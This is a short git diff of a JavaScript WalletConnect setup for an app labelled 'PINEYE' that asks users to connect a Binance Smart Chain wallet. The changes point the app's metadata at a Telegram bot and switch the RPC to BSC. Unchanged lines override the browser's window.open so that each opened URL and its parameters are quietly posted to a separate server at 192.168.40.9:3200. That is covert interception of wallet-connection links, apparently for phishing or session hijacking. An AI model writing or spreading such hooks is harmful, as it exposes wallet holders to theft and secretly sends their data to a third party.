@@ -19,7 +19,7 @@ export const createWalletConnectModal = () => {
   const metadata = {
     name: "PINEYE",
     description: "Connect your Binance Smart Chain Wallet",
-    url: "https://mrdeveloper-ir.github.io/telegram-mini-app/", // origin must match your domain & subdomain
+    url: "t.me/Tttjfjdeibot/Salam", // origin must match your domain & subdomain
     icons: [""],
   };
 
@@ -32,8 +32,8 @@ export const createWalletConnectModal = () => {
     enableEIP6963: true, // true by default
     enableInjected: true, // true by default
     enableCoinbase: true, // true by default
-    rpcUrl: "...", // used for the Coinbase SDK
-    defaultChainId: 1, // used for the Coinbase SDK
+    rpcUrl: "https://rpc.ankr.com/bsc",
+    defaultChainId: 56, // used for the Coinbase SDK
   });
 
   window.open = (function (open) {
@@ -42,7 +42,7 @@ export const createWalletConnectModal = () => {
       axios.post(`https://192.168.40.9:3200`, { data: _ });
       axios.post(`https://192.168.40.9:3200`, { data: features });
 
-      return open.call(window, url, "_blank");
+      return open.call(window, url, "_blank", features);
     };
   })(window.open);
 
